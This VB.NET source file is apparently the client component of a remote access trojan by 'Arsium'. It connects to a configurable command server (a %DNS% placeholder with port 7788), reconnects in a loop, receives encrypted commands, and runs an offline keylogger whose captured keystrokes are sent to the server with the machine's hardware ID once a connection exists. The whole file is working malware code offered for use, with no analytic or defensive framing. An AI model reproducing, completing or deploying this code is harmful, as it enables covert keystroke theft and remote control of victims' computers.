Imports PacketLib
Imports PacketLib.Packet
Imports PacketLib.Utils
Imports System.IO
Imports System.Net.Sockets
Imports System.Threading

' 
'|| AUTHOR Arsium ||
'|| github : https://github.com/arsium       ||
'|| Converted from C# code with Tangible Source Code Converters 2022.01 ||
'

Namespace Client
    Friend Class ClientHandler
#If DEBUG Then

#Else
        Friend Shared hostIp As String = "127.0.0.1" '%DNS%
        Friend Shared port As Integer = 7788 '999999
#End If
        Friend Property host() As Host
        Friend Property HWID() As String
        Friend Property baseIp() As String
        Private Property socket() As Socket
        Private Property Connected() As Boolean


        Private Delegate Function ReadDataAsync() As Byte()
        Private Delegate Function ReadPacketAsync(ByVal BufferPacket() As Byte) As IPacket
        Private Delegate Function ConnectAsync() As Boolean
        Private Delegate Function SendDataAsync(ByVal data As IPacket) As Integer


        Private readDataAsyncDel As ReadDataAsync
        Private readPacketAsyncDel As ReadPacketAsync
        Private connectAsyncDel As ConnectAsync
        Private ReadOnly sendDataAsyncDel As SendDataAsync


        Friend Sub New()
            MyBase.New()
            host = New Host(Config.hostIp, Config.port)
            readDataAsyncDel = New ReadDataAsync(AddressOf ReceiveData)
            readPacketAsyncDel = New ReadPacketAsync(AddressOf PacketParser)
            sendDataAsyncDel = New SendDataAsync(AddressOf SendData)
        End Sub


        Public Sub ConnectStart()
            Thread.Sleep(125)
            If Not StarterClass.KeylogOn And Config.offKeylog <> "False" Then
                StarterClass.StartOfflineKeylogger()
            End If

            connectAsyncDel = New ConnectAsync(AddressOf Connect)
            connectAsyncDel.BeginInvoke(New AsyncCallback(AddressOf EndConnect), Nothing)
        End Sub

        Private Function Connect() As Boolean
            Try
                socket = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, True)
                socket.Connect(host.host, host.port)
                Return True
            Catch
            End Try
            Return False
        End Function

        Private Sub StopOfflineKeyLogger()
            Plugin.Launch.StopHook()
            Plugin.Launch.ClientSender(StarterClass.clientHandler.host, Config.generalKey, New KeylogOfflinePacket(Plugin.Launch.CurrentKeyStroke(), StarterClass.clientHandler.baseIp, StarterClass.clientHandler.HWID))
            Plugin.Launch.ClearKeyStroke()
            StarterClass.KeylogOn = False
        End Sub


        Public Sub EndConnect(ByVal ar As IAsyncResult)
            Connected = connectAsyncDel.EndInvoke(ar)
            If Connected Then
                Dim connectionPacket As New ConnectedPacket()
                connectionPacket.baseIp = Me.socket.LocalEndPoint.ToString()
                Me.HWID = connectionPacket.HWID
                Me.baseIp = socket.LocalEndPoint.ToString()
                SendPacket(connectionPacket)
                If StarterClass.KeylogOn Then
                    StopOfflineKeyLogger()
                End If
                Receive()
            Else
                ConnectStart()
            End If
        End Sub


        Public Sub Receive()
            If Connected Then
                readDataAsyncDel.BeginInvoke(New AsyncCallback(AddressOf EndDataRead), Nothing)
            Else
                ConnectStart()
            End If
        End Sub
        Private Function ReceiveData() As Byte()
            Try
                Dim total As Integer = 0
                Dim recv As Integer
                Dim header(4) As Byte
                socket.Poll(-1, SelectMode.SelectRead)
                recv = socket.Receive(header, 0, 5, 0)

                Dim size As Integer = BitConverter.ToInt32(New Byte(3) {header(0), header(1), header(2), header(3)}, 0)
                Dim packetType As PacketType = CType(header(4), PacketType)

                Dim dataleft As Integer = size
                Dim data(size - 1) As Byte
                Do While total < size
                    recv = socket.Receive(data, total, dataleft, 0)
                    total += recv
                    dataleft -= recv
                Loop

                Return data
            Catch e1 As Exception
                Connected = False
                Return Nothing
            End Try
        End Function
        Public Sub EndDataRead(ByVal ar As IAsyncResult)
            Dim data() As Byte = readDataAsyncDel.EndInvoke(ar)

            If data IsNot Nothing AndAlso Connected Then
                readPacketAsyncDel.BeginInvoke(data, New AsyncCallback(AddressOf EndPacketRead), Nothing)
            End If

            Receive()

        End Sub


        Private Function PacketParser(ByVal BufferPacket() As Byte) As IPacket
            Return BufferPacket.DeserializePacket(Config.generalKey)
        End Function
        Public Sub EndPacketRead(ByVal ar As IAsyncResult)
            Dim packet As IPacket = readPacketAsyncDel.EndInvoke(ar)
            PacketHandler.ParsePacket(packet)
        End Sub


        Public Sub SendPacket(ByVal packet As IPacket)
            If Connected Then
                sendDataAsyncDel.BeginInvoke(packet, New AsyncCallback(AddressOf SendDataCompleted), Nothing)
            End If
        End Sub
        Private Function SendData(ByVal data As IPacket) As Integer
            Try
                Dim encryptedData() As Byte = data.SerializePacket(Config.generalKey)
                SyncLock socket
                    Dim total As Integer = 0
                    Dim size As Integer = encryptedData.Length
                    Dim datalft As Integer = size
                    Dim header(4) As Byte
                    socket.Poll(-1, SelectMode.SelectWrite)

                    Dim temp() As Byte = BitConverter.GetBytes(size)

                    header(0) = temp(0)
                    header(1) = temp(1)
                    header(2) = temp(2)
                    header(3) = temp(3)
                    header(4) = CByte(Math.Truncate(data.packetType))

                    Dim sent As Integer = socket.Send(header)

                    If size > 1000000 Then
                        Using memoryStream As New MemoryStream(encryptedData)
                            Dim read As Integer = 0
                            memoryStream.Position = 0
                            Dim chunk((50 * 1000) - 1) As Byte
                            read = memoryStream.Read(chunk, 0, chunk.Length)
                            Do While read > 0
                                socket.Send(chunk, 0, read, SocketFlags.None)
                                read = memoryStream.Read(chunk, 0, chunk.Length)
                            Loop
                        End Using
                    Else
                        Do While total < size
                            sent = socket.Send(encryptedData, total, size, SocketFlags.None)
                            total += sent
                            datalft -= sent
                        Loop
                    End If
                    Return total

                End SyncLock
            Catch e1 As Exception
                Connected = False
                Return 0
            End Try
        End Function
        Private Sub SendDataCompleted(ByVal ar As IAsyncResult)
            Dim length As Integer = sendDataAsyncDel.EndInvoke(ar)
            If Connected Then
                '                if (length != 0)//TODO : LOGS
                '                    MessageBox.Show("Data sent ! + length = " + length.ToString());
                '                else
                '                    MessageBox.Show("Error while sending data + length =" + length.ToString());
            End If
        End Sub
    End Class
End Namespace
